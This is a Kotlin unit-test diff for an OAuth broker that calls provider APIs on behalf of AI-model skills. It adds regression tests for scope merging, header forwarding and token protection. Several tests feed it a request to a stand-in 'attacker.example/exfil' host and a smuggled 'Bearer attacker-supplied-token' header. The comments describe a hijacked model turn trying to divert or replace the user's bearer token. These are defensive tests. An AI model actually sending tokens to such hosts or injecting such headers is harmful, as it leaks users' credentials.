@@ -1,5 +1,10 @@
 package ru.souz.skilloauth.impl
 
+import io.ktor.client.HttpClient
+import io.ktor.client.engine.mock.MockEngine
+import io.ktor.client.engine.mock.respond
+import io.ktor.http.HttpHeaders
+import io.ktor.http.headersOf
 import java.time.Clock
 import java.time.Instant
 import java.time.ZoneOffset
@@ -20,16 +25,17 @@ import ru.souz.skilloauth.SkillOAuthException
  */
 class SkillOAuthApiImplTest {
     private val fixedClock = Clock.fixed(Instant.parse("2026-01-01T00:00:00Z"), ZoneOffset.UTC)
+    private val testCryptoKey = java.util.Base64.getEncoder().encodeToString(ByteArray(32))
+    private val testCrypto = SkillOAuthTokenCrypto(testCryptoKey)
 
     private fun newApi(
         credentialRepository: SkillOAuthCredentialRepository = InMemorySkillOAuthCredentialRepository(),
         pendingStateRepository: SkillOAuthPendingStateRepository = InMemorySkillOAuthPendingStateRepository(),
+        httpClient: HttpClient = defaultSkillOAuthHttpClient(),
     ) = SkillOAuthApiImpl(
         credentialRepository = credentialRepository,
         pendingStateRepository = pendingStateRepository,
-        crypto = SkillOAuthTokenCrypto(
-            java.util.Base64.getEncoder().encodeToString(ByteArray(32))
-        ),
+        crypto = SkillOAuthTokenCrypto(testCryptoKey),
         providers = mapOf(
             "yandex" to AuthorizationCodeOAuthClient(
                 config = AuthorizationCodeOAuthConfig(
@@ -43,6 +49,7 @@ class SkillOAuthApiImplTest {
                 ),
             )
         ),
+        httpClient = httpClient,
         clock = fixedClock,
     )
 
@@ -54,7 +61,7 @@ class SkillOAuthApiImplTest {
             SkillOAuthCredential(
                 userId = "user-1",
                 provider = "yandex",
-                accessTokenEncrypted = "enc",
+                accessTokenEncrypted = testCrypto.encrypt("real-access-token"),
                 refreshTokenEncrypted = null,
                 grantedScopes = grantedScopes,
                 expiresAt = null,
@@ -126,6 +133,34 @@ class SkillOAuthApiImplTest {
     }
 
     @Test
+    fun `startAuthorization supersedes an existing pending state for the same user and provider`() = runTest {
+        // Regression test: without superseding, two overlapping ConnectOAuthProvider calls for the
+        // same (userId, provider) would leave two live `state` tokens; whichever callback landed
+        // last would upsert only its own requestedScopes, silently dropping what the first flow's
+        // completed authorization just granted.
+        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
+        val api = newApi(pendingStateRepository = pendingStateRepository)
+
+        val first = api.startAuthorization(
+            userId = "user-1",
+            provider = "yandex",
+            skillId = "skill-1",
+            scopes = listOf("login:info"),
+        )
+        val second = api.startAuthorization(
+            userId = "user-1",
+            provider = "yandex",
+            skillId = "skill-2",
+            scopes = listOf("iot:control"),
+        )
+
+        val firstState = first.url.substringAfter("state=").substringBefore("&")
+        assertTrue(pendingStateRepository.consume(firstState, fixedClock.instant()) == null)
+        val secondScopeParam = second.url.substringAfter("scope=").substringBefore("&")
+        assertEquals("login:info iot:control", java.net.URLDecoder.decode(secondScopeParam, "UTF-8"))
+    }
+
+    @Test
     fun `callAuthorizedApi rejects a skill that is not connected yet`() = runTest {
         val api = newApi()
 
@@ -135,7 +170,7 @@ class SkillOAuthApiImplTest {
                 provider = "yandex",
                 skillId = "skill-1",
                 requiredScopes = emptyList(),
-                request = ApiCallRequest(method = "GET", path = "https://login.yandex.ru/info"),
+                request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
             )
         }
     }
@@ -150,7 +185,7 @@ class SkillOAuthApiImplTest {
                 provider = "yandex",
                 skillId = "skill-1",
                 requiredScopes = listOf("login:info", "iot:control"),
-                request = ApiCallRequest(method = "GET", path = "https://login.yandex.ru/info"),
+                request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
             )
         }
     }
@@ -158,7 +193,7 @@ class SkillOAuthApiImplTest {
     @Test
     fun `callAuthorizedApi rejects a URL host outside the provider's allowlist`() = runTest {
         // Regression test: without this check, a hijacked model turn could redirect the real
-        // bearer token to an attacker-controlled or internal host via the model-supplied `path`.
+        // bearer token to an attacker-controlled or internal host via the model-supplied `url`.
         val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))
 
         assertFailsWith<SkillOAuthException> {
@@ -167,7 +202,7 @@ class SkillOAuthApiImplTest {
                 provider = "yandex",
                 skillId = "skill-1",
                 requiredScopes = listOf("login:info"),
-                request = ApiCallRequest(method = "GET", path = "https://attacker.example/exfil"),
+                request = ApiCallRequest(method = "GET", url = "https://attacker.example/exfil"),
             )
         }
     }
@@ -182,9 +217,72 @@ class SkillOAuthApiImplTest {
                 provider = "yandex",
                 skillId = "skill-1",
                 requiredScopes = listOf("login:info"),
-                request = ApiCallRequest(method = "GET", path = "http://login.yandex.ru/info"),
+                request = ApiCallRequest(method = "GET", url = "http://login.yandex.ru/info"),
             )
         }
+    }
+
+    @Test
+    fun `callAuthorizedApi forwards caller headers and response headers`() = runTest {
+        var capturedHeaders: io.ktor.http.Headers? = null
+        val mockEngine = MockEngine { request ->
+            capturedHeaders = request.headers
+            respond(
+                content = "{}",
+                status = io.ktor.http.HttpStatusCode.OK,
+                headers = headersOf("X-Provider-Header", listOf("provider-value")),
+            )
+        }
+        val api = newApi(
+            credentialRepository = connectedCredentialRepository(listOf("login:info")),
+            httpClient = HttpClient(mockEngine),
+        )
+
+        val response = api.callAuthorizedApi(
+            userId = "user-1",
+            provider = "yandex",
+            skillId = "skill-1",
+            requiredScopes = listOf("login:info"),
+            request = ApiCallRequest(
+                method = "GET",
+                url = "https://login.yandex.ru/info",
+                headers = mapOf("X-Custom" to "custom-value"),
+            ),
+        )
+
+        assertEquals("custom-value", capturedHeaders?.get("X-Custom"))
+        assertEquals("provider-value", response.headers["X-Provider-Header"])
+    }
+
+    @Test
+    fun `callAuthorizedApi never lets a caller-supplied Authorization header override the real access token`() = runTest {
+        // Regression test: `headers` on ApiCallRequest is a model-supplied field; without this
+        // protection a hijacked model turn could smuggle its own `Authorization` value and either
+        // clobber the real bearer token in transit or (depending on server behavior) have both
+        // sent, defeating the whole point of injecting the token server-side.
+        var capturedAuthorization: String? = null
+        val mockEngine = MockEngine { request ->
+            capturedAuthorization = request.headers[HttpHeaders.Authorization]
+            respond(content = "{}", status = io.ktor.http.HttpStatusCode.OK)
+        }
+        val api = newApi(
+            credentialRepository = connectedCredentialRepository(listOf("login:info")),
+            httpClient = HttpClient(mockEngine),
+        )
+
+        api.callAuthorizedApi(
+            userId = "user-1",
+            provider = "yandex",
+            skillId = "skill-1",
+            requiredScopes = listOf("login:info"),
+            request = ApiCallRequest(
+                method = "GET",
+                url = "https://login.yandex.ru/info",
+                headers = mapOf("Authorization" to "Bearer attacker-supplied-token"),
+            ),
+        )
+
+        assertEquals("Bearer real-access-token", capturedAuthorization)
     }
 
     @Test
